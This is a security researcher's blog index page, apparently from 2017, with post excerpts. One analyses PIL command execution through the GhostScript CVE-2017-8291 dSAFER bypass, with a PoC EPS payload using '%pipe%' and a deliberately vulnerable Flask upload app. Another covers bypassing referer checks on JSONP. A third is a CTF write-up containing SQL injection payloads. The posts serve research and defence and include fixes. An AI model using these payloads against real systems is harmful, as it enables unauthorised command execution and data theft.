<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  
  <title>Nearg1e - Web Develop&amp;Security / 安全研究 / 漏洞挖掘 / 安全开发 / Pyer / Anime</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script type="text/javascript" src="/js/highlight.pack.js"></script>
  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=58637942" charset="UTF-8"></script>
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link rel="alternative" href="/atom.xml" title="Nearg1e" type="application/atom+xml">
  
  <!--[if lt IE 9]>
    <script type="text/javascript" src="/js/html5.js"></script>
    <script type="text/javascript" src="/js/css3-mediaqueries.js"></script>
  <![endif]-->
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">

</head>
<body>
    <header id="header">
    <div class="nav-warp">
      <nav id="nav" class="w">
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/about">About</a>
        
          <a class="main-nav-link" href="/atom.xml">RSS</a>
        
          <a class="main-nav-link" href="https://github.com/neargle">Project</a>
        
        <a id="nav-search" class="icon-search fr" onclick="show_search()" title="搜索"></a>
        <div id="nav-search-input" class="hide">
          <form class="search-form" onsubmit="return dispatch()">
            <input type="hidden" id="site" value="site:http://blog.neargle.com">
            <input type="text" id="q" class="input-text" name="q" placeholder="搜索">
            <input type="submit" value="" class="input-submit">
          </form>
        </div>
      </nav>
    </div>
    
      <div id="logo">
        <div class="hg">
        
          <h1 id="site-title">
            <a href="/">Nearg1e</a>
          </h1>
          
            <h2 id="site-description">Web Develop&amp;Security / 安全研究 / 漏洞挖掘 / 安全开发 / Pyer / Anime</h2>
          
        
          <!-- <p>微博:<a href="http://weibo.com/neargle">@Neargle</a></p> -->
        </div>
      </div>
    
  </header>

  <!-- <div id='wrap'> -->
    <div id='outer'>
      <section id="main">
  
    <article class="post">
  <header class="post-head">
    
  
    
      <h2 class="post-title">
        <a href="/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/">Exploiting Python PIL Module Command Execution Vulnerability</a>
      </h2>
    
  

    
<time datetime="2017-09-28T05:28:54.000Z" class="post-time">2017-09-28</time>

  </header>
  
  <section class="post-content typo">
    
      <p>这是我用来支持先知和代码审计小密圈活动的文章，首发于: <a href="https://xianzhi.aliyun.com/forum/read/2163.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/2163.html</a></p>
<p><strong>PIL</strong> (Python Image Library) 应该是 Python 图片处理库中运用最广泛的，它拥有强大的功能和简洁的API。很多Python Web应用在需要实现处理图片的功能时，都会选择使用PIL。</p>
<p>PIL在对 eps 图片格式进行处理的时候，如果环境内装有 GhostScript，则会调用 GhostScript 在dSAFER模式下处理图片，即使是最新版本的PIL模块，也会受到 <code>GhostButt CVE-2017-8291</code> dSAFER模式Bypass漏洞的影响，产生命令执行漏洞。</p>
<p>据说大牛们看源码和 dockerfile 就可以了：<a href="https://github.com/neargle/PIL-RCE-By-GhostButt" target="_blank" rel="external">https://github.com/neargle/PIL-RCE-By-GhostButt</a></p>
<h2 id="一个简单常见的Demo">一个简单常见的Demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_img_size</span><span class="params">(filepath=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="string">'''获取图片长宽'''</span></span><br><span class="line">    <span class="keyword">if</span> filepath:</span><br><span class="line">        img = Image.open(filepath)</span><br><span class="line">        img.load()</span><br><span class="line">        <span class="keyword">return</span> img.size</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>我们在 Demo 里调用了PIL的 <code>Image.open</code>, <code>Image.load</code> 方法加载图片，最后返回图片的长和宽。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: get_img_size(<span class="string">'/tmp/images.png'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: (<span class="number">183</span>, <span class="number">275</span>)</span><br></pre></td></tr></table></figure>
<h2 id="分析">分析</h2><h3 id="Image-open_图片格式判断的问题">Image.open 图片格式判断的问题</h3><p>PIL在 <code>Image.open</code> 函数里面判断图片的格式，首先它调用 <code>_open_core</code> 函数， 在<code>_open_core</code>里面则是调用各个格式模块中的<code>_accept</code>函数，判断所处理的图片属于哪一个格式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_open_core</span><span class="params">(fp, filename, prefix)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ID:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            factory, accept = OPEN[i]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> accept <span class="keyword">or</span> accept(prefix):</span><br><span class="line">                fp.seek(<span class="number">0</span>)</span><br><span class="line">                im = factory(fp, filename)</span><br><span class="line">                _decompression_bomb_check(im.size)</span><br><span class="line">                <span class="keyword">return</span> im</span><br><span class="line">        <span class="keyword">except</span> (SyntaxError, IndexError, TypeError, struct.error):</span><br><span class="line">            <span class="comment"># Leave disabled by default, spams the logs with image</span></span><br><span class="line">            <span class="comment"># opening failures that are entirely expected.</span></span><br><span class="line">            <span class="comment"># logger.debug("", exc_info=True)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">im = _open_core(fp, filename, prefix)</span><br></pre></td></tr></table></figure>
<p>这里 <code>_accept(prefix)</code> 函数中的参数 prefix 就是图片文件头部的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PIL/GifImagePlugin.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_accept</span><span class="params">(prefix)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> prefix[:<span class="number">6</span>] <span class="keyword">in</span> [<span class="string">b"GIF87a"</span>, <span class="string">b"GIF89a"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># PIL/EpsImagePlugin.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_accept</span><span class="params">(prefix)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> prefix[:<span class="number">4</span>] == <span class="string">b"%!PS"</span> <span class="keyword">or</span> \</span><br><span class="line">           (len(prefix) &gt;= <span class="number">4</span> <span class="keyword">and</span> i32(prefix) == <span class="number">0xC6D3D0C5</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现PIL使用文件头来判断文件类型，也就是说即使我们用它处理一个以<code>.jpg</code>结尾的文件，只要文件内容以<code>%!PS</code>开头，那么PIL就会返回一个<code>PIL.EpsImagePlugin.EpsImageFile</code>对象，使用eps格式的逻辑去处理它。之后调用的load方法也是<code>EpsImageFile</code>里面的load方法。</p>
<h3 id="Image-load_到_subprocess-check_call">Image.load 到 subprocess.check_call</h3><p>真实的环境中，程序员可能不会刻意去调用<code>load()</code>方法，但是其实Image文件中几乎所有的功能函数都会调用到<code>load()</code>。在 PIL/EpsImagePlugin.py 文件内我们关注的调用链为: <code>load()</code> -&gt; <code>Ghostscript()</code> -&gt; <code>subprocess.check_call()</code>, 最后使用<code>subprocess.check_call</code>执行了 gs 命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">command = [<span class="string">"gs"</span>,</span><br><span class="line">            <span class="string">"-q"</span>,                         <span class="comment"># quiet mode</span></span><br><span class="line">            <span class="string">"-g%dx%d"</span> % size,             <span class="comment"># set output geometry (pixels)</span></span><br><span class="line">            <span class="string">"-r%fx%f"</span> % res,              <span class="comment"># set input DPI (dots per inch)</span></span><br><span class="line">            <span class="string">"-dBATCH"</span>,                    <span class="comment"># exit after processing</span></span><br><span class="line">            <span class="string">"-dNOPAUSE"</span>,                  <span class="comment"># don't pause between pages,</span></span><br><span class="line">            <span class="string">"-dSAFER"</span>,                    <span class="comment"># safe mode</span></span><br><span class="line">            <span class="string">"-sDEVICE=ppmraw"</span>,            <span class="comment"># ppm driver</span></span><br><span class="line">            <span class="string">"-sOutputFile=%s"</span> % outfile,  <span class="comment"># output file</span></span><br><span class="line">            <span class="string">"-c"</span>, <span class="string">"%d %d translate"</span> % (-bbox[<span class="number">0</span>], -bbox[<span class="number">1</span>]),</span><br><span class="line">                                            <span class="comment"># adjust for image origin</span></span><br><span class="line">            <span class="string">"-f"</span>, infile,                 <span class="comment"># input file</span></span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略判断是GhostScript是否安装的代码</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(os.devnull, <span class="string">'w+b'</span>) <span class="keyword">as</span> devnull:</span><br><span class="line">        subprocess.check_call(command, stdin=devnull, stdout=devnull)</span><br><span class="line">    im = Image.open(outfile)</span><br></pre></td></tr></table></figure>
<p>最后其执行的命令为<code>gs -q -g100x100 -r72.000000x72.000000 -dBATCH -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/tmp/tmpi8gqd19k -c 0 0 translate -f ../poc.png</code>, 可以看到PIL使用了 dSAFER 参数。这个参数限制了文件删除,重命名和命令执行等行为,只允许 gs 打开标准输出和标准错误输出。而 <code>GhostButt CVE-2017-8291</code> 刚好就是 dSAFER 参数的bypass。</p>
<h3 id="GhostButt_CVE-2017-8291">GhostButt CVE-2017-8291</h3><p>该漏洞的详细的分析可以看 binjo 师傅的文章:<a href="http://wiki.ioin.in/url/APWQ" target="_blank" rel="external">GhostButt - CVE-2017-8291利用分析</a>，原先我复现和构造POC的时候花费了很多时间，后来看了这篇文章，给了我很多帮助。</p>
<p>这里我们用的poc和文章里面一样使用，也就是msf里面的poc:<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/poc.png" target="_blank" rel="external">poc.png</a>。虽然这里修改 eps 后缀为 png ，但其实文件内容确实典型的<code>eps</code>文件。截取部分内容如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%!PS-Adobe-3.0 EPSF-3.0&#10;%%BoundingBox: -0 -0 100 100&#10;&#10;... &#30465;&#30053;&#10;&#10;currentdevice null false mark /OutputFile (%pipe%touch /tmp/aaaaa)</span><br></pre></td></tr></table></figure>
<p>我们需要构造的命令执行payload就插入在这里 : <code>(%pipe%touch /tmp/aaaaa)</code>。</p>
<h2 id="真实环境（伪）和复现">真实环境（伪）和复现</h2><p>我使用之前写的的demo函数和Flask file-upload-sample写了一个简单的 Web app:<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/src/app.py" target="_blank" rel="external">app.py</a>，使这个本地命令执行变成一个远程命令执行。主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp'</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'png'</span>])</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_img_size</span><span class="params">(filepath=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="string">'''获取图片长宽'''</span></span><br><span class="line">    <span class="keyword">if</span> filepath:</span><br><span class="line">        img = Image.open(filepath)</span><br><span class="line">        img.load()</span><br><span class="line">        <span class="keyword">return</span> img.size</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="string">'''判断文件后缀是否合法'''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''文件上传app'''</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">'No file part'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        image_file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> image_file.filename == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">'No selected file'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">if</span> image_file <span class="keyword">and</span> allowed_file(image_file.filename):</span><br><span class="line">            filename = secure_filename(image_file.filename)</span><br><span class="line">            img_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">            image_file.save(img_path)</span><br><span class="line">            height, width = get_img_size(img_path)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;the image\'s height : &#123;&#125;, width : &#123;&#125;; &lt;/body&gt;&lt;/html&gt;'</span>\</span><br><span class="line">                .format(height, width)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span><br><span class="line">    &lt;!doctype html&gt;</span><br><span class="line">    &lt;title&gt;Upload new File&lt;/title&gt;</span><br><span class="line">    &lt;h1&gt;Upload new File&lt;/h1&gt;</span><br><span class="line">    &lt;form method=post enctype=multipart/form-data&gt;</span><br><span class="line">      &lt;p&gt;&lt;input type=file name=file&gt;</span><br><span class="line">         &lt;input type=submit value=Upload&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    '''</span></span><br></pre></td></tr></table></figure>
<p>考虑到在 Windows 上面安装 PIL 和 GhostScript 可能会比较费劲，这里给大家提供一个 <a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Dockerfile" target="_blank" rel="external">dockerfile</a>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/neargle/PIL-RCE-By-GhostButt.git &amp;&amp; <span class="built_in">cd</span> PIL-RCE-By-GhostButt</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up <span class="operator">-d</span></span><br></pre></td></tr></table></figure>
<p>访问 <a href="http://localhost:8000/" target="_blank" rel="external">http://localhost:8000/</a> 可以看到文件上传页面。程序只使用允许后缀为 png 的文件上传，并在上传成功之后使用PIL获取图片长宽。我们修改poc，使用dnslog来验证漏洞。</p>
<p>页面截图:<br><img src="https://raw.githubusercontent.com/neargle/PIL-RCE-By-GhostButt/master/1.png" alt=""></p>
<p>DNSlog:<br><img src="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/2.png?raw=true" alt=""></p>
<h2 id="总结">总结</h2><h3 id="什么情况下我们的web服务会受到该漏洞影响">什么情况下我们的web服务会受到该漏洞影响</h3><ul>
<li>使用Python PIL库处理图片(应该是任意版本)</li>
<li>环境中有GhostScript(version &lt;= 9.21)</li>
</ul>
<h3 id="如何修复？">如何修复？</h3><p>一个是升级 GhostScript 版本。当然更新 PIL 的版本并不能解决问题，因为 pip 不会帮我们升级GhostScript。</p>
<p>另外在 Python 代码里面，如果我们的web程序不需要处理 eps 格式，除了对文件头进行判断排除 eps 文件之外，借用PIL自带的程序逻辑，也可以避免产生命令执行漏洞。PIL.Image会在 <code>init()</code> 里面加载 PIL 目录下的所有图片格式的处理方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _initialized</span><br><span class="line">    <span class="keyword">if</span> _initialized &gt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> plugin <span class="keyword">in</span> _plugins:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logger.debug(<span class="string">"Importing %s"</span>, plugin)</span><br><span class="line">            __import__(<span class="string">"PIL.%s"</span> % plugin, globals(), locals(), [])</span><br><span class="line">        <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">            logger.debug(<span class="string">"Image: failed to import %s: %s"</span>, plugin, e)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>但同时也为我们提供了preinit()方法，该方法只加载 Bmp, Gif, Jpeg, Ppm, Png，这五种常见图片格式的处理方法。只需在用<code>open</code>函数打开图片文件之前，使用 <code>preinit()</code>，并设置 <code>_initialized</code> 的值大于等于2，即可避免 Image 调用 GhostScript 去解析 eps 文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Image.preinit()</span><br><span class="line">Image._initialized = <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h2 id="最后">最后</h2><p>其实 Python 开发过程中有很多经典的代码执行或者命令执行问题，包括但不限于以下几种:</p>
<ul>
<li><code>pickle.loads(user_input)</code> : yaml, pickle等库在反序列化时产生的代码执行</li>
<li><code>Template(user_input)</code> : 模板注入(SSTI)所产生的代码执行</li>
<li><code>eval(user_input)</code> : eval等代码执行函数所导致的任意代码执行</li>
<li><code>subprocess.call(user_input, shell=True)</code> : popen, subprocess.call等函数所导致的命令执行</li>
</ul>
<p>PIL 这里出现的问题是比较少被提及的，实际的生产环境中到底常不常见就只能期待大家的反馈了。欢迎任何角度的纠错以及观点独到的建议。感谢祝好。</p>
<h2 id="Link">Link</h2><ul>
<li><a href="https://github.com/neargle/PIL-RCE-By-GhostButt" target="_blank" rel="external">https://github.com/neargle/PIL-RCE-By-GhostButt</a></li>
<li><a href="https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs921/ghostscript-9.21-linux-x86_64.tgz" target="_blank" rel="external">https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs921/ghostscript-9.21-linux-x86_64.tgz</a></li>
<li><a href="https://paper.seebug.org/310/" target="_blank" rel="external">https://paper.seebug.org/310/</a></li>
</ul>

    
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
    
  <ul class="post-tag home-tag icon-tag fl">
    
      <li><a href="/tags/Python/">#Python</a></li>
    
  </ul>

    
      
        <a href="http://blog.neargle.com/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/#disqus_thread" class="post-foot-link fr">评论</a>
      
    
    </section>
  </footer>
  
</article>
  
    <article class="post">
  <header class="post-head">
    
  
    
      <h2 class="post-title">
        <a href="/2017/09/01/use-request-merging-to-bypass-referer-check/">使用request merging bypass referer(jsonp) 检测</a>
      </h2>
    
  

    
<time datetime="2017-08-31T19:01:11.000Z" class="post-time">2017-09-01</time>

  </header>
  
  <section class="post-content typo">
    
      <p><em>更新两篇之前在其他地方发过的文章</em></p>
<h2 id="1-_关于request_merging和其会产生的问题">1. 关于request merging和其会产生的问题</h2><p>request merging : 浏览器会把多次相同的请求(并非所有请求)合并成一次，以加快资源加载速度。</p>
<p>e.g.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>只会请求并加载一次”<a href="http://0.0.0.0:8888/jsonp/1&quot;资源。">http://0.0.0.0:8888/jsonp/1&quot;资源。</a></p>
<p><em>曾经有研究指出，这种请求合并想象在iframe里也存在</em>，那么浏览器的这种特性就可以用来bypass部分程序的referer的判断，如jsonp的防御机制。</p>
<h2 id="2-_环境和POC">2. 环境和POC</h2><p>绕过referer检测，攻击者能否拿到进行referer保护的用户信息？</p>
<p>攻击者服务器： <a href="http://example.com:8081">http://example.com:8081</a><br>目标服务器： <a href="http://example.com:8082">http://example.com:8082</a><br>referer检测： referer是否以“<a href="http://example.com:8082”开头">http://example.com:8082”开头</a><br>目标： 攻击者拿到属于用户的 “security content”</p>
<h3 id="环境：">环境：</h3><p>/jsonp.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">(<span class="variable">$url</span>, <span class="variable">$domain</span>)</span> </span>&#123;</span><br><span class="line">     <span class="variable">$length</span> = strlen(<span class="variable">$domain</span>);</span><br><span class="line">     <span class="keyword">return</span> (substr(<span class="variable">$url</span>, <span class="number">0</span>, <span class="variable">$length</span>) === <span class="variable">$domain</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$referrer</span> = @<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (startsWith(<span class="variable">$referrer</span>, <span class="string">"http://example.com:8082"</span>)) &#123;</span><br><span class="line">    <span class="variable">$js_code</span> = <span class="string">'function jquery() &#123; return "security content";&#125;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$js_code</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$js_code</span> = <span class="string">'function jquery() &#123; return "nothing";&#125;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$js_code</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
    
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
    
  <ul class="post-tag home-tag icon-tag fl">
    
      <li><a href="/tags/前端安全/">#前端安全</a></li>
    
  </ul>

    
      <a href="/2017/09/01/use-request-merging-to-bypass-referer-check/#more" class="post-foot-link fr">阅读全文</a>
    
    </section>
  </footer>
  
</article>
  
    <article class="post">
  <header class="post-head">
    
  
    
      <h2 class="post-title">
        <a href="/2017/09/01/ddctf-web-xss-sqli-writeup/">ddctf 两道web题的Writeup (sqli &amp; xss)</a>
      </h2>
    
  

    
<time datetime="2017-08-31T19:01:10.000Z" class="post-time">2017-09-01</time>

  </header>
  
  <section class="post-content typo">
    
      <p><em>更新两篇之前在其他地方发过的文章</em></p>
<h2 id="sqli">sqli</h2><p>地址: <a href="http://118.190.134.8/t1/news.php?id=1">http://118.190.134.8/t1/news.php?id=1</a></p>
<p>尝试sql注入，会发现过滤了’和空格等。使用<br><a href="http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1">http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1</a> 和 <a href="http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2">http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2</a> 判断注入存在，开始思考出数据的方法</p>
<p><a href="http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5">http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5</a><br>判断字段数为4</p>
<p><a href="http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4">http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4</a><br>发现过滤了逗号</p>
<p>那就不好用union出数据了，可选择使用盲注出数据比如<code>(select%a0ascii(substr((select%a0TABLE_NAME%a0from%a0information_schema.tables%a0where%a0TABLE_TYPE%a0=%a0&quot;BASE%a0TABLE&quot;%a0limit%a01%a0OFFSET%a02)%a0from%a01%a0for%a01))=1)%23</code>。但是这里其实有一个union出数据的tip可以使用:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql $&#62; select 1,2,3,4 Union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d&#10;+-----+-----+-----+-----+&#10;|   1 |   2 |   3 |   4 |&#10;|-----+-----+-----+-----|&#10;|   1 |   2 |   3 |   4 |&#10;+-----+-----+-----+-----+</span><br></pre></td></tr></table></figure>
    
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
    
  <ul class="post-tag home-tag icon-tag fl">
    
      <li><a href="/tags/CTF/">#CTF</a></li>
    
  </ul>

    
      <a href="/2017/09/01/ddctf-web-xss-sqli-writeup/#more" class="post-foot-link fr">阅读全文</a>
    
    </section>
  </footer>
  
</article>
  
    <article class="post">
  <header class="post-head">
    
  
    
      <h2 class="post-title">
        <a href="/2017/04/12/Django-CVE-2017-7233-bypass-is-safe-url-and-CVE-2017-7233-serve-open-url/">Django的两则url跳转漏洞:CVE-2017-7233和CVE-2017-7234分析</a>
      </h2>
    
  

    
<time datetime="2017-04-12T15:55:00.000Z" class="post-time">2017-04-12</time>

  </header>
  
  <section class="post-content typo">
    
      <p><a href="https://www.djangoproject.com/weblog/2017/apr/04/security-releases/">Django官方News&amp;Event</a>在4月4日发布了一个安全更新，修复了两个URL跳转的漏洞，一个是urlparse的锅，另一个来自国内的安全研究员 phithon@长亭,都非常漂亮。因为有复现Django漏洞的习惯，晚上抽了点时间复现了一下。有趣的点还挺多。把两个漏洞的分析整合在一起，凑了篇文章。（还是研究漏洞有趣啊，泪流满面QAQ）</p>
